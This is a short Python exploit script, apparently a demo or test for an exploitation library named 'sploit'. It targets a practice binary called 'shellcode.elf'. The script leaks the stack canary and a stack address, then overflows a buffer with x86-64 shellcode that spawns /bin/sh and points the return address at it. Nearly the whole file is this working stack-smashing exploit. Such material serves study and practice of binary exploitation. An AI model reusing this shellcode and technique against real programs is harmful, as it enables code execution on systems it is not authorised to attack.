from sploit.until import lastline, contains, equals
from sploit.arch import btoi, arch
from sploit.mem import Symtbl
from sploit.payload import Payload
from sploit.rev.elf import ELF

elf = ELF('shellcode.elf')

stack = elf.locals.vuln
stack.ret = arch.wordsize
stack.prevframe = (elf.locals.main,stack.ret+arch.wordsize)
stack.rebase(stack.buf)

#/bin/sh
shellcode = b"\x48\x31\xf6\x48\x31\xd2\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"

p = Payload().bin(b'GREP').pad_front(stack.canary+1)

io.readlineuntil(lastline,contains,b'Enter')
io.write(p())
io.readuntil(equals, b'.*GREP')
canary = b'\x00' + io.read(arch.wordsize-1)
canary = btoi(canary)
print("Leaked Canary: "+hex(canary))
addr = io.readline()[:-1]
addr = btoi(addr)
print("Leaked Previous Stack Base: "+hex(addr))

mem = stack.map(addr,stack.prevframe.sbp)

p,_ = stack.payload = (Payload(),stack.buf)
p.bin(shellcode, "shellcode")
p.pad(stack.canary).int(canary).sbp()
p.ret(mem.payload.shellcode)

io.readlineuntil(lastline,contains,b'Enter')
print("Injecting Shellcode at Return Address: "+hex(mem.payload.shellcode))
io.write(p())

import time
time.sleep(0.1)

#io.interact()
io.writeline(b"echo \"Win!\"")
io.writeline(b"exit")

